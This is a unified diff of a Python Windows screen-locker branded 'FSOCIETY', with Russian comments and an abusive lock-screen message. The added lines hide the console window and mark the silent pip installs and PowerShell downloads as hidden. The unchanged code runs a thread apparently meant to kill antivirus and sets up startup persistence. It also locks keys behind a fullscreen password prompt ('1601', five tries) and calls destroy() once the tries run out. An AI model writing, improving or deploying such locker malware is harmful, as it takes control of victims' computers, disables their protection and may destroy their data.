@@ -1,10 +1,21 @@
 import os, sys, time, threading, tempfile, ctypes, winreg, shutil, subprocess, urllib.request, tkinter as tk
 
+# ============================================================
+# СКРЫТНАЯ АВТОУСТАНОВКА ВСЕХ ЗАВИСИМОСТЕЙ
+# ============================================================
 for lib, name in [("cv2","opencv-python"),("pygame","pygame"),("keyboard","keyboard"),("numpy","numpy")]:
-    try: __import__(lib)
-    except: subprocess.check_call([sys.executable,"-m","pip","install",name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+    try:
+        __import__(lib)
+    except:
+        subprocess.check_call(
+            [sys.executable, "-m", "pip", "install", name],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=subprocess.CREATE_NO_WINDOW  # Скрытое окно
+        )
 
 import cv2, pygame, keyboard, numpy as np
+import winsound
 
 PASS = "1601"
 TRIES = 5
@@ -17,6 +28,7 @@ V = os.path.join(T, "v.mp4")
 M = os.path.join(T, "m.mp3")
 tries = TRIES
 
+# СКРЫТОЕ СКАЧИВАНИЕ
 def dl(url, path):
     if os.path.exists(path) and os.path.getsize(path) > 10000: return True
     try:
@@ -24,7 +36,9 @@ def dl(url, path):
         if os.path.getsize(path) > 10000: return True
     except: pass
     try:
-        subprocess.run(['powershell','-WindowStyle','Hidden','-Command',f"(New-Object Net.WebClient).DownloadFile('{url}','{path}')"],capture_output=True,creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command',
+            f"(New-Object Net.WebClient).DownloadFile('{url}','{path}')"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         if os.path.getsize(path) > 10000: return True
     except: pass
     return False
@@ -103,24 +117,9 @@ def anim():
 
 def video():
     if not dl(VIDEO_URL,V): return
-    time.sleep(0.5)
-    sound_proc = None
-    try:
-        sound_proc = subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet',V], 
-                                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
-                                      creationflags=subprocess.CREATE_NO_WINDOW)
-    except:
-        try:
-            pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
-            pygame.mixer.music.load(V)
-            pygame.mixer.music.set_volume(1.0)
-            pygame.mixer.music.play()
-        except: pass
     try:
         cap=cv2.VideoCapture(V)
-        if not cap.isOpened():
-            if sound_proc: sound_proc.terminate()
-            return
+        if not cap.isOpened(): return
         fps=cap.get(cv2.CAP_PROP_FPS) or 30
         cv2.namedWindow("FSOCIETY",cv2.WND_PROP_FULLSCREEN)
         cv2.setWindowProperty("FSOCIETY",cv2.WND_PROP_FULLSCREEN,cv2.WINDOW_FULLSCREEN)
@@ -130,11 +129,6 @@ def video():
             cv2.imshow("FSOCIETY",frame); cv2.waitKey(int(1000/fps))
         cap.release(); cv2.destroyAllWindows()
         for _ in range(5): cv2.waitKey(1)
-    except: pass
-    if sound_proc:
-        try: sound_proc.terminate()
-        except: pass
-    try: pygame.mixer.music.stop()
     except: pass
 
 class Locker:
@@ -153,18 +147,7 @@ class Locker:
         self.tick()
         try:
             if dl(MUSIC_URL,M):
-                time.sleep(0.3)
-                try:
-                    subprocess.Popen(['ffplay','-nodisp','-loop','0','-loglevel','quiet',M], 
-                                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
-                                    creationflags=subprocess.CREATE_NO_WINDOW)
-                except:
-                    try:
-                        pygame.mixer.init()
-                        pygame.mixer.music.load(M)
-                        pygame.mixer.music.set_volume(1.0)
-                        pygame.mixer.music.play(-1)
-                    except: pass
+                winsound.PlaySound(M, winsound.SND_ASYNC | winsound.SND_LOOP)
         except: pass
         msg=f"""Вот чего доводит интернет.
 
@@ -209,9 +192,8 @@ YOU FUCK.
     def chk(self,e=None):
         global tries
         if self.e.get()==PASS:
-            try: pygame.mixer.music.stop()
+            try: winsound.PlaySound(None, 0)
             except: pass
-            os.system("taskkill /f /im ffplay.exe >nul 2>&1")
             unlock_keys()
             self.sl.config(text="ВЕРНО!",fg='white'); self.w.update()
             try: os.remove(TIMER)
@@ -221,16 +203,21 @@ YOU FUCK.
             tries-=1
             if tries>0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {tries}",fg='white')
             else:
-                try: pygame.mixer.music.stop()
+                try: winsound.PlaySound(None, 0)
                 except: pass
-                os.system("taskkill /f /im ffplay.exe >nul 2>&1")
                 self.sl.config(text="404 | ОШИБКА",fg='white'); self.w.update()
                 time.sleep(2); destroy()
             self.e.delete(0,tk.END)
 
 if __name__=="__main__":
-    threading.Thread(target=kill_av,daemon=True).start()
-    threading.Thread(target=timer_check,daemon=True).start()
+    # Скрываем консоль
+    try:
+        import win32console, win32gui
+        ctypes.windll.user32.ShowWindow(win32console.GetConsoleWindow(), 0)
+    except: pass
+    
+    threading.Thread(target=kill_av, daemon=True).start()
+    threading.Thread(target=timer_check, daemon=True).start()
     startup()
     anim()
     lock_keys()
